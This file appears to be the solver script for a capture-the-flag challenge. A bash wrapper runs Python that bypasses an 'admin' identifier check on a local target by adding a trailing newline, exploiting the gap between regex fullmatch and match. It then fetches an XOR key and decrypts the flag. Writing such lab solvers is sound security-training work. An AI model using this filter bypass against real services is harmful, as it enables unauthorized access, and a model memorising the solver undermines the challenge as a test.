#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, json, sys
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# Step 1: Bypass the fullmatch filter using trailing newline.
# fullmatch("admin", "admin\n") → None, but match("admin$", "admin\n") → Match.
body = json.dumps({"id": "admin\n"}).encode()
req = Request(base + "/api/beacon", data=body,
              headers={"Content-Type": "application/json"}, method="POST")
resp = urlopen(req, timeout=5)
encrypted = base64.b32decode(resp.read())

# Step 2: Fetch the XOR key from /api/key.
key_resp = urlopen(base + "/api/key", timeout=5)
key_info = json.loads(key_resp.read())
key = bytes.fromhex(key_info["key"])

# Step 3: XOR-decrypt and write the flag.
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode("utf-8")
print(flag)
PY
